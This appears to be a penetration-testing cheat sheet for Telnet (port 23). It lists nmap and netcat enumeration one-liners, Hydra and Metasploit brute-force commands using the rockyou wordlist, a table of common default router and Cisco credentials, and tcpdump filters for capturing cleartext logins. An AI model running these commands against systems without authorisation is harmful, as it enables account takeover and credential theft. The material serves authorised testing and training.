# Port 23 - Telnet

## Table of Contents
- [Enumeration](#enumeration)
- [Banner Grabbing](#banner-grabbing)
- [Brute Force](#brute-force)
- [Exploitation](#exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
# Nmap all telnet scripts
nmap -p 23 --script "telnet-*" -sV $rhost

# Quick banner grab
echo -e "\n" | nc -nvw 3 $rhost 23 2>&1 | head -5
```

---

## Brute Force (One-liner)

```shell
# Hydra brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -t 4 telnet://$rhost

# Metasploit
msfconsole -q -x "use auxiliary/scanner/telnet/telnet_login; set RHOSTS $rhost; set USER_FILE users.txt; set PASS_FILE /usr/share/wordlists/rockyou.txt; run; exit"
```

---

## Exploitation

### Common Default Credentials

| Device/Service | Username | Password |
| :--- | :--- | :--- |
| Cisco | cisco | cisco |
| Cisco | admin | admin |
| Router | admin | admin |
| Router | root | root |
| Embedded | root | (blank) |

### Cisco Telnet

```shell
# Connect
telnet $rhost

# Enable mode
enable
show running-config
show version
```

### Capture Credentials (Cleartext)

```shell
# Wireshark filter
tcp.port == 23

# tcpdump
tcpdump -i eth0 port 23 -A
```

---

## Quick Reference

| Command | Description |
| :--- | :--- |
| `telnet $rhost` | Connect to telnet |
| `nc -nv $rhost 23` | Banner grab |
| `hydra -l admin -P pass.txt telnet://$rhost` | Brute force |
